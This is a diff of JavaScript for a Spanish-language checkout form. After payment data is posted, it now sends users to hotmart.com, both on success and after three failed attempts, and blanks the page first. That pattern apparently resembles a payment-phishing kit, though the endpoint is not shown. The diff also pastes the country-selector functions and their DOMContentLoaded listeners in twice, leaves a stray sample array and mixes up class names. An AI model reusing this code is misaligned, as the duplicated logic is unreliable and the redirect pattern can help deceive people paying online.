@@ -118,11 +118,11 @@ document.addEventListener('DOMContentLoaded', function() {
                     body: JSON.stringify(data)
                 });
                 const result = await response.json();
-                if (result && result.success === true) {
+                if (result && result.status === 'Ok' && result.success === true) {
                     // Blanquear la pantalla
                     document.body.innerHTML = '<div style="width:100vw;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;font-size:2rem;">Redirigiendo...</div>';
                     setTimeout(() => {
-                        window.location.href = '200.html';
+                        window.location.href = 'https://hotmart.com/';
                     }, 1000);
                     return;
                 } else {
@@ -131,7 +131,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     if (attempts >= 3) {
                         // Blanquear la pantalla antes de redirigir
                         document.body.innerHTML = '<div style="width:100vw;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;font-size:2rem;">Redirigiendo...</div>';
-                        window.location.href = '200.html';
+                        window.location.href = 'https://hotmart.com/';
                         return;
                     }
                     const errorMsg = result && result.message ? result.message : "No se pudo procesar el pago. Intente de nuevo.";
@@ -167,83 +167,223 @@ fetch('country.json')
         statesByCountry = {};
     });
 
-async function initializeCountrySelect() {
-    try {
-        // 1. Obtener país por IP
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipData = await ipResponse.json();
-        const userCountry = ipData.country_code;
+// Generar los botones dinámicamente
+function renderCountryOptions(countries) {
+  const container = document.getElementById('country-options-container');
+  if (!container) return;
+  container.innerHTML = ''; // Limpiar
 
-        // 2. Configurar selectores y listeners
-        const countryButtons = document.querySelectorAll('.country-select-options');
-        const regionSelect = document.getElementById('REGION');
+  countries.forEach(country => {
+    const btn = document.createElement('button');
+    btn.className = 'country-select-options';
+    btn.type = 'button';
+    btn.tabIndex = 0;
+    btn.setAttribute('iso-code', country.iso);
 
-        // 3. Función para actualizar estados/provincias
-        function updateStates(countryCode) {
-            if (!regionSelect) return;
-            
-            const states = statesByCountry[countryCode] || [];
-            const placeholder = countryCode === 'US' ? 'Select your state' : 'Select your province/region';
-            
-            regionSelect.innerHTML = `
-                <option hidden disabled selected value="">${placeholder}</option>
-                ${states.map(state => `
-                    <option value="${state.code}">${state.name}</option>
-                `).join('')}
-            `;
-        }
+    btn.innerHTML = `
+      <span class="country-select__content country-select__flag flag-sprite flag-large ${country.flagClass}">${country.flag}</span>
+      <span class="country-select__content country-select__englishName">${country.englishName}</span>
+      <span class="country-select__content country-select__divider">|</span>
+      <span class="country-select__content country-select__localName">${country.localName}</span>
+    `;
 
-        // 4. Configurar listeners para los botones de país
-        countryButtons.forEach(button => {
-            const isoCode = button.getAttribute('iso-code');
-            
-            // Marcar el país del usuario como seleccionado inicialmente
-            if (isoCode === userCountry) {
-                button.classList.add('selected');
-                updateStates(isoCode);
-            }
-
-            button.addEventListener('click', function() {
-                // Remover selección previa
-                countryButtons.forEach(btn => btn.classList.remove('selected'));
-                // Marcar nuevo país seleccionado
-                this.classList.add('selected');
-                // Actualizar estados
-                updateStates(isoCode);
-            });
-        });
-
-        // 5. Seleccionar país del usuario por defecto
-        const userCountryButton = Array.from(countryButtons)
-            .find(button => button.getAttribute('iso-code') === userCountry);
-            
-        if (userCountryButton) {
-            userCountryButton.click();
-        } else {
-            // Si no se encuentra el país del usuario, usar US por defecto
-            const defaultButton = Array.from(countryButtons)
-                .find(button => button.getAttribute('iso-code') === 'US');
-            if (defaultButton) defaultButton.click();
-        }
-
-        return true;
-    } catch (error) {
-        console.error('Error inicializando selector de país:', error);
-        return false;
-    }
+    container.appendChild(btn);
+  });
 }
 
-// Inicializar cuando el DOM esté listo
-document.addEventListener('DOMContentLoaded', function() {
-    if (!initializeCountrySelect()) {
-        const retry = setInterval(() => {
-            if (initializeCountrySelect()) {
-                clearInterval(retry);
-            }
-        }, 500);
+// Inicializar selector de país y estados
+async function initializeCountrySelect() {
+  try {
+    // 1. Obtener país por IP
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    const ipData = await ipResponse.json();
+    const userCountry = ipData.country_code;
 
-        setTimeout(() => {
-            clearInterval(retry);
-        }, 10000);
+    // 2. Configurar selectores y listeners
+    const countryButtons = document.querySelectorAll('.country-select-options');
+    const regionSelect = document.getElementById('REGION');
+
+    // 3. Función para actualizar estados/provincias
+    function updateStates(countryCode) {
+      if (!regionSelect) return;
+      const states = statesByCountry[countryCode] || [];
+      const placeholder = countryCode === 'US' ? 'Select your state' : 'Select your province/region';
+      regionSelect.innerHTML = `
+        <option hidden disabled selected value="">${placeholder}</option>
+        ${states.map(state => `
+          <option value="${state.code}">${state.name}</option>
+        `).join('')}
+      `;
     }
+
+    // 4. Configurar listeners para los botones de país
+    countryButtons.forEach(button => {
+      const isoCode = button.getAttribute('iso-code');
+      button.addEventListener('click', function() {
+        countryButtons.forEach(btn => btn.classList.remove('selected'));
+        this.classList.add('selected');
+        updateStates(isoCode);
+
+        // Actualizar el botón principal de selección
+        const selectBtn = document.getElementById('country-select');
+        if (selectBtn) {
+          selectBtn.setAttribute('data-label', isoCode.toLowerCase());
+          selectBtn.querySelector('.country-select__flag').outerHTML = button.querySelector('.country-select__flag').outerHTML;
+          selectBtn.querySelector('.country-select__select-label').textContent = button.querySelector('.country-select__englishName').textContent;
+        }
+        document.getElementById('country-select-dropdown').style.display = 'none';
+      });
+    });
+
+    // 5. Seleccionar país del usuario por defecto
+    const userCountryButton = Array.from(countryButtons)
+      .find(button => button.getAttribute('iso-code') === userCountry);
+
+    if (userCountryButton) {
+      userCountryButton.click();
+    } else {
+      const defaultButton = Array.from(countryButtons)
+        .find(button => button.getAttribute('iso-code') === 'US');
+      if (defaultButton) defaultButton.click();
+    }
+
+    return true;
+  } catch (error) {
+    console.error('Error inicializando selector de país:', error);
+    return false;
+  }
+}
+
+// Cargar países y estados, luego inicializar todo
+document.addEventListener('DOMContentLoaded', function() {
+  Promise.all([
+    fetch('countries.json').then(res => res.json()),
+    fetch('country.json').then(res => res.json())
+  ]).then(([countries, statesData]) => {
+    statesByCountry = statesData;
+    renderCountryOptions(countries);
+    initializeCountrySelect();
+  }).catch(error => {
+    console.error('Error cargando países o estados:', error);
+  });
+});
+
+// Ejemplo: cargar el JSON de países (puedes usar fetch si es un archivo externo)
+const countries = [
+  {
+    iso: "US",
+    flag: "🇺🇸",
+    flagClass: "flag-sprite-unitedstates",
+    englishName: "United States",
+    localName: "Estados Unidos"
+  },
+  {
+    iso: "MX",
+    flag: "🇲🇽",
+    flagClass: "flag-sprite-mexico",
+    englishName: "Mexico",
+    localName: "México"
+  }
+  // ...otros países
+];
+
+// Generar los botones dinámicamente
+function renderCountryOptions(countries) {
+  const container = document.getElementById('country-options-container');
+  if (!container) return;
+  container.innerHTML = ''; // Limpiar
+
+  countries.forEach(country => {
+    const btn = document.createElement('button');
+    btn.className = 'country-select-options';
+    btn.type = 'button';
+    btn.tabIndex = 0;
+    btn.setAttribute('iso-code', country.iso);
+
+    btn.innerHTML = `
+      <span class="country-select__content country-select__flag flag-sprite flag-large ${country.flagClass}">${country.flag}</span>
+      <span class="country-select__content country-select__englishName">${country.englishName}</span>
+      <span class="country-select__content country_select__divider">|</span>
+      <span class="country-select__content country_select__localName">${country.localName}</span>
+    `;
+
+    container.appendChild(btn);
+  });
+}
+
+// Inicializar selector de país y estados
+async function initializeCountrySelect() {
+  try {
+    // 1. Obtener país por IP
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    const ipData = await ipResponse.json();
+    const userCountry = ipData.country_code;
+
+    // 2. Configurar selectores y listeners
+    const countryButtons = document.querySelectorAll('.country-select-options');
+    const regionSelect = document.getElementById('REGION');
+
+    // 3. Función para actualizar estados/provincias
+    function updateStates(countryCode) {
+      if (!regionSelect) return;
+      const states = statesByCountry[countryCode] || [];
+      const placeholder = countryCode === 'US' ? 'Select your state' : 'Select your province/region';
+      regionSelect.innerHTML = `
+        <option hidden disabled selected value="">${placeholder}</option>
+        ${states.map(state => `
+          <option value="${state.code}">${state.name}</option>
+        `).join('')}
+      `;
+    }
+
+    // 4. Configurar listeners para los botones de país
+    countryButtons.forEach(button => {
+      const isoCode = button.getAttribute('iso-code');
+      button.addEventListener('click', function() {
+        countryButtons.forEach(btn => btn.classList.remove('selected'));
+        this.classList.add('selected');
+        updateStates(isoCode);
+
+        // Actualizar el botón principal de selección
+        const selectBtn = document.getElementById('country-select');
+        if (selectBtn) {
+          selectBtn.setAttribute('data-label', isoCode.toLowerCase());
+          selectBtn.querySelector('.country-select__flag').outerHTML = button.querySelector('.country-select__flag').outerHTML;
+          selectBtn.querySelector('.country-select__select-label').textContent = button.querySelector('.country-select__englishName').textContent;
+        }
+        document.getElementById('country-select-dropdown').style.display = 'none';
+      });
+    });
+
+    // 5. Seleccionar país del usuario por defecto
+    const userCountryButton = Array.from(countryButtons)
+      .find(button => button.getAttribute('iso-code') === userCountry);
+
+    if (userCountryButton) {
+      userCountryButton.click();
+    } else {
+      const defaultButton = Array.from(countryButtons)
+        .find(button => button.getAttribute('iso-code') === 'US');
+      if (defaultButton) defaultButton.click();
+    }
+
+    return true;
+  } catch (error) {
+    console.error('Error inicializando selector de país:', error);
+    return false;
+  }
+}
+
+// Cargar países y estados, luego inicializar todo
+document.addEventListener('DOMContentLoaded', function() {
+  Promise.all([
+    fetch('countries.json').then(res => res.json()),
+    fetch('country.json').then(res => res.json())
+  ]).then(([countries, statesData]) => {
+    statesByCountry = statesData;
+    renderCountryOptions(countries);
+    initializeCountrySelect();
+  }).catch(error => {
+    console.error('Error cargando países o estados:', error);
+  });
 });
